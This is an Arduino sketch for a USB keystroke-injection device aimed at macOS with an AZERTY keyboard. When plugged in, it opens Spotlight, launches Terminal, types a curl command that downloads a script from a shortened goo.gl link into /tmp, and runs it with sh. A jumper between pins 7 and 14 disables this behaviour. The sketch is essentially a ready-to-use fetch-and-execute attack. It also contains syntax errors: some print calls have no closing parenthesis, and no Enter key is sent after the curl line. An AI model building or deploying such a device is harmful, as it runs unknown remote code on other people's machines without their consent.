#include "azertykeyboard.h"

int RXLED = 17;

void setup(){

  pinMode(RXLED, OUTPUT);
  
  // ACTIVE OR NOT HACK
  // PUT JUMPER ENTER 7 && 14 TO PREVENT HACK
  pinMode(7, OUTPUT);
  digitalWrite(7, LOW);
  pinMode(14, INPUT_PULLUP);
    
  if(digitalRead(14) == LOW){
    blinkNoHack();
  }else {
    Keyboard.begin();
  
    delay(100);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(' ');
    Keyboard.releaseAll();

    delay(500);
    Keyboard.print(F("terminal"));
  
    delay(500);
    typeKey(KEY_RETURN);

    Keyboard.print(F("curl -L http://goo.gl/tM4UU9 > /tmp/toto.sh")    
    delay(1000);

    Keyboard.print(F("sh /tmp/toto.sh")
    delay(500);
    typeKey(KEY_RETURN);
    
    Keyboard.end();
  }
}


void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void blinkNoHack()
{
  delay(1000);
  digitalWrite(RXLED, HIGH);
  delay(1000);
  digitalWrite(RXLED, LOW);
  delay(1000);
  digitalWrite(RXLED, HIGH);
  delay(1000);
  digitalWrite(RXLED, LOW);
}


/* Unused endless loop */
void loop() {}
